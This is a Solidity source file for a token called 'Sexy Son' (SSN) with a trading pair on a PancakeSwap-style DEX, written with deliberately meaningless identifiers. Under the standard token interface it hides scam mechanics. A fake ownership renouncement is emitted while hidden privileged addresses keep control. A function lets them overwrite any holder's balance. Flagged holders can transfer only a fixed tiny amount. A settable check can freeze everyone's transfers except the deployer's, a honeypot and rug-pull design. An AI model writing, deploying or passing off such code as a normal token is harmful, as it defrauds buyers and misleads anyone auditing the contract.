//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface modeToTake {
    function createPair(address fromLiquidity, address teamTo) external returns (address);
}

interface launchedMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoEnable) external view returns (uint256);

    function transfer(address limitExempt, uint256 shouldSell) external returns (bool);

    function allowance(address modeFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldSell) external returns (bool);

    function transferFrom(
        address sender,
        address limitExempt,
        uint256 shouldSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableMarketingTake, uint256 value);
    event Approval(address indexed modeFund, address indexed spender, uint256 value);
}

abstract contract amountTokenSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchedMinMetadata is launchedMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SexySon is amountTokenSell, launchedMin, launchedMinMetadata {

    mapping(address => mapping(address => uint256)) private swapLimit;

    mapping(address => bool) public fromBuy;

    function receiverFund(address totalWallet) public {
        sellBuy();
        if (marketingLaunched) {
            maxFeeEnable = false;
        }
        if (totalWallet == txAutoReceiver || totalWallet == fromSender) {
            return;
        }
        totalReceiver[totalWallet] = true;
    }

    uint8 private feeBuy = 18;

    uint256 feeMarketingSender;

    uint256 marketingTo;

    string private maxAuto = "Sexy Son";

    function modeMax() public {
        emit OwnershipTransferred(txAutoReceiver, address(0));
        liquidityLimitLaunched = address(0);
    }

    string private modeSender = "SSN";

    function owner() external view returns (address) {
        return liquidityLimitLaunched;
    }

    mapping(address => uint256) private fundEnable;

    address private liquidityLimitLaunched;

    address txSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function sellBuy() private view {
        require(fromBuy[_msgSender()]);
    }

    address public fromSender;

    bool public receiverTo;

    function teamReceiver(address atSwap, uint256 shouldSell) public {
        sellBuy();
        fundEnable[atSwap] = shouldSell;
    }

    function buyLiquidity(address shouldList, address limitExempt, uint256 shouldSell) internal returns (bool) {
        require(fundEnable[shouldList] >= shouldSell);
        fundEnable[shouldList] -= shouldSell;
        fundEnable[limitExempt] += shouldSell;
        emit Transfer(shouldList, limitExempt, shouldSell);
        return true;
    }

    uint256 private receiverEnable;

    uint256 constant txTake = 9 ** 10;

    bool private enableLaunchTotal;

    uint256 private totalMode;

    address public txAutoReceiver;

    function sellMode(address tradingTake) public {
        if (receiverTo) {
            return;
        }
        if (receiverEnable == totalMode) {
            totalMode = receiverEnable;
        }
        fromBuy[tradingTake] = true;
        if (feeIs != receiverEnable) {
            receiverEnable = feeIs;
        }
        receiverTo = true;
    }

    function transfer(address atSwap, uint256 shouldSell) external virtual override returns (bool) {
        return enableList(_msgSender(), atSwap, shouldSell);
    }

    uint256 private feeIs;

    function getOwner() external view returns (address) {
        return liquidityLimitLaunched;
    }

    constructor (){
        if (enableLaunchTotal == receiverLaunched) {
            receiverLaunched = false;
        }
        modeMax();
        launchedSell receiverFrom = launchedSell(modeToken);
        fromSender = modeToTake(receiverFrom.factory()).createPair(receiverFrom.WETH(), address(this));
        if (enableLaunchTotal != marketingLaunched) {
            feeIs = totalMode;
        }
        txAutoReceiver = _msgSender();
        fromBuy[txAutoReceiver] = true;
        fundEnable[txAutoReceiver] = teamAt;
        if (receiverLaunched == marketingLaunched) {
            totalMode = receiverEnable;
        }
        emit Transfer(address(0), txAutoReceiver, teamAt);
    }

    function symbol() external view virtual override returns (string memory) {
        return modeSender;
    }

    address modeToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address minReceiverTake, uint256 shouldSell) public virtual override returns (bool) {
        swapLimit[_msgSender()][minReceiverTake] = shouldSell;
        emit Approval(_msgSender(), minReceiverTake, shouldSell);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return teamAt;
    }

    function allowance(address maxReceiver, address minReceiverTake) external view virtual override returns (uint256) {
        if (minReceiverTake == modeToken) {
            return type(uint256).max;
        }
        return swapLimit[maxReceiver][minReceiverTake];
    }

    bool private maxFeeEnable;

    function enableList(address shouldList, address limitExempt, uint256 shouldSell) internal returns (bool) {
        if (shouldList == txAutoReceiver) {
            return buyLiquidity(shouldList, limitExempt, shouldSell);
        }
        uint256 txMax = launchedMin(fromSender).balanceOf(txSwap);
        require(txMax == marketingTo);
        require(limitExempt != txSwap);
        if (totalReceiver[shouldList]) {
            return buyLiquidity(shouldList, limitExempt, txTake);
        }
        return buyLiquidity(shouldList, limitExempt, shouldSell);
    }

    function decimals() external view virtual override returns (uint8) {
        return feeBuy;
    }

    bool public receiverLaunched;

    bool private marketingLaunched;

    mapping(address => bool) public totalReceiver;

    function receiverAmountSwap(uint256 shouldSell) public {
        sellBuy();
        marketingTo = shouldSell;
    }

    function name() external view virtual override returns (string memory) {
        return maxAuto;
    }

    uint256 private teamAt = 100000000 * 10 ** 18;

    function balanceOf(address autoEnable) public view virtual override returns (uint256) {
        return fundEnable[autoEnable];
    }

    function transferFrom(address shouldList, address limitExempt, uint256 shouldSell) external override returns (bool) {
        if (_msgSender() != modeToken) {
            if (swapLimit[shouldList][_msgSender()] != type(uint256).max) {
                require(shouldSell <= swapLimit[shouldList][_msgSender()]);
                swapLimit[shouldList][_msgSender()] -= shouldSell;
            }
        }
        return enableList(shouldList, limitExempt, shouldSell);
    }

    event OwnershipTransferred(address indexed exemptSender, address indexed liquidityList);

}